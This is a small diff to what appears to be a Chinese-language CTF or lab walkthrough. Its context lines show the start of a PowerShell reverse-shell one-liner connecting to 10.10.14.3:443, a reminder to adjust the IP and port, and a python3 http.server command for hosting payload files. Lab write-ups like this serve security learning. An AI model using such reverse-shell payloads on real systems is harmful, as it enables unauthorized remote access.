@@ -142,6 +142,7 @@ $client = New-Object System.Net.Sockets.TCPClient("10.10.14.3",443);$stream = $c
 注意修改一下 `ip`，`端口`
 
 接下来我们使用 python3 来托管文件
+
 `sudo python3 -m http.server 80`
 
 ![](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1600848857109.png)
